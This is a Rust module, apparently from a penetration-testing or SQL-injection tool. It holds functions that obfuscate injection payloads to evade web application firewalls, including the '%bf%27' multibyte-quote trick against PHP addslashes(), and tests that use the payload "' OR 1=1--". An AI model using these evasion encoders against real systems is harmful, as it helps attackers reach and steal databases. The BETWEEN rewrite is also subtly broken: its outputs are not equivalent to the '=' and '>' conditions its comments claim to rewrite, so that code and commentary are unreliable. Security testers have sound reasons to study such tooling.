//! SQL-specific obfuscation strategies.

use crate::error::EncodeError;
use std::fmt::Write as _;

/// Between obfuscation — rewrites `=` and `>` using `BETWEEN` syntax.
///
/// Safe for: SQL contexts.
pub fn between_obfuscate(payload: &str) -> String {
    let mut result = String::with_capacity(payload.len() * 3);
    for ch in payload.chars() {
        if ch == '=' {
            // Rewrite `id=1` → `id BETWEEN 0 AND 1`
            // We just replace `=` with ` BETWEEN 0 AND `
            result.push_str(" BETWEEN 0 AND ");
        } else if ch == '>' {
            result.push_str(" NOT BETWEEN 0 AND ");
        } else {
            result.push(ch);
        }
    }
    result
}

/// Unmagic quotes — multi-byte quote escape for PHP multi-byte charsets.
///
/// Emits `%bf%27` (or similar) to exploit `addslashes()` when the connection
/// charset is GBK, Big5, or Shift-JIS.
pub fn unmagic_quotes(payload: impl AsRef<[u8]>) -> Result<String, EncodeError> {
    let payload = payload.as_ref();
    let payload_str = std::str::from_utf8(payload).map_err(|_| EncodeError::InvalidUtf8)?;
    // The classic sequence is %bf%27 (0xbf 0x27) which forms a valid multi-byte
    // character in GBK/Big5/Shift-JIS, consuming the backslash and leaving the quote.
    Ok(payload_str.replace('\'', "%bf%27"))
}

/// Percentage prefix — adds `%` before each character.
///
/// Lightweight bypass against WAFs that tokenize on alphanumeric boundaries
/// but do not strip leading `%` signs.
pub fn percentage_prefix(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 2);
    for ch in payload.chars() {
        let _ = write!(&mut out, "%{ch}");
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn between_obfuscate_basic() {
        assert_eq!(between_obfuscate("id=1"), "id BETWEEN 0 AND 1");
        assert_eq!(between_obfuscate("id>0"), "id NOT BETWEEN 0 AND 0");
    }

    #[test]
    fn unmagic_quotes_basic() {
        assert_eq!(unmagic_quotes("' OR 1=1--").unwrap(), "%bf%27 OR 1=1--");
    }

    #[test]
    fn percentage_prefix_basic() {
        assert_eq!(percentage_prefix("SELECT"), "%S%E%L%E%C%T");
    }
}
